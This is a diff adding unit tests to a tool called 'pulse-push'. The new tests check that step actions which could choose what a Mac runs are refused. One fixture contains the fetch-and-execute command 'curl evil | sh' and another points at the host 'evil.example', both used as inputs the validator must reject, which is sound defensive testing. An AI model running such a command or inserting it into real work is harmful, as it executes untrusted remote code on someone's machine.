@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import json
 import pathlib
 import runpy
 import unittest
@@ -8,6 +9,7 @@ ROOT = pathlib.Path(__file__).resolve().parents[1]
 PULSE_PUSH = runpy.run_path(str(ROOT / "bin" / "pulse-push"))
 validate_card_actions = PULSE_PUSH["validate_card_actions"]
 validate_action_revision_change = PULSE_PUSH["validate_action_revision_change"]
+parse_step_actions = PULSE_PUSH["parse_step_actions"]
 # validate_queue_contract removed 2026-08-14 (CODE#5): queue v1's migration
 # was never applied to the live database; the function and these fixtures
 # (valid_queue_action/valid_gate/valid_continuation) tested dead code that
@@ -96,6 +98,35 @@ class TypedCardActionValidationTest(unittest.TestCase):
         old = {"actions": [valid_action()]}
         with self.assertRaisesRegex(ValueError, "would remove typed action"):
             validate_action_revision_change(old, {})
+
+
+
+class RetiredStepActionTest(unittest.TestCase):
+    """2026-09-19: step actions may no longer choose what the Mac runs."""
+
+    def assert_refused(self, action):
+        with self.assertRaises(SystemExit):
+            parse_step_actions(json.dumps([action]), "Do the thing")
+
+    def test_verify_command_is_refused(self):
+        self.assert_refused({"command": "clipboard_take_and_deploy", "payload": {
+            "destination": {"type": "netlify_env", "site": "x", "env_key": "K"},
+            "verify_command": "curl evil | sh"}})
+
+    def test_vps_env_file_is_refused(self):
+        self.assert_refused({"command": "clipboard_take_and_deploy", "payload": {
+            "destination": {"type": "vps_env_file", "host": "evil.example", "path": "/x", "env_key": "K"}}})
+
+    def test_clipboard_set_is_refused(self):
+        self.assert_refused({"command": "clipboard_set", "payload": {"text": "x"}})
+
+    def test_group_bc_credential_and_open_session_still_accepted(self):
+        actions = [
+            {"command": "clipboard_take_and_deploy", "payload": {
+                "destination": {"type": "group_bc_credential", "credential": "gemini"}}},
+            {"command": "open_session", "payload": {"message": "Start Tower"}},
+        ]
+        self.assertEqual(parse_step_actions(json.dumps(actions), "one\ntwo"), actions)
 
 
 if __name__ == "__main__":
